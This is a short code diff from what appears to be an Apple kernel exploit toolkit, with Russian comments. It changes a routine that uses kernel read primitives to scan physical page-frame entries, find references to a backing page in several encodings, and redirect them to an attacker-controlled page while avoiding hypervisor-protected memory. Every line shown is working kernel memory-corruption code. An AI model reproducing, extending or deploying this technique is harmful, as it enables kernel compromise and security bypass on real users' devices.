@@ -6254,7 +6254,8 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
             uint64_t nent = totalPages2 - fb; if (nent > 4096) nent = 4096;
             kreadbuf(ftVA2 + fb * 16, ftCh2, (size_t)(nent * 16));
             for (uint64_t e = 0; e < nent && nDep < 24; e++) {
-                if (ftCh2[e * 16 + 2] != 0x21) continue;
+                uint8_t t2 = ftCh2[e * 16 + 2];
+                if (!(t2 == 0x21 || t2 == 0x6 || t2 == 0xc)) continue;   // 1.9.203: + VMEM-типы 0x6/0xc — pfn-источник вне 0x21
                 uint64_t pa = kconstant(physBase) + (fb + e) * 0x4000;
                 uint64_t kva = gPrimitives.phystokv ? gPrimitives.phystokv(pa) : 0;
                 if (!kva || kpVAIsEL2Domain(kva)) continue;
@@ -6266,6 +6267,7 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
                     if (q == backingPA) form = 1;
                     else if ((uint32_t)(q >> 32) == pfn32 && (q & 0xffffffffULL) == 1) form = 3;   // слот-форма pfn<<32|1 — отличительная
                     else if ((uint32_t)q == pfn32 && (q >> 32) && (q >> 32) <= 0x10) form = 4;      // pfn low32 + малый hi32
+                    else if (q == (uint64_t)pfn32) form = 2;                                      // 1.9.203: голый pfn, hi=0
                     if (!form) continue;
                     hitAddr[nDep] = kva + o; hitOld[nDep] = q; hitForm[nDep] = form; nDep++;
                 }
@@ -6277,6 +6279,7 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
             if (hitForm[i] == 1) nq = (hitOld[i] & 0x3fffULL) | ctlPA;
             else if (hitForm[i] == 3) nq = ((uint64_t)ctlPFN << 32) | (hitOld[i] & 0xffffffffULL);
             else if (hitForm[i] == 4) nq = (hitOld[i] & 0xffffffff00000000ULL) | ctlPFN;
+            else if (hitForm[i] == 2) nq = (uint64_t)ctlPFN;
             kpNote(r, [NSString stringWithFormat:@"    [DEP]#%d форма%d @ %#llx: %#018llx → %#018llx",
                       i, hitForm[i], (unsigned long long)hitAddr[i], (unsigned long long)hitOld[i], (unsigned long long)nq]);
             usleep(2000);
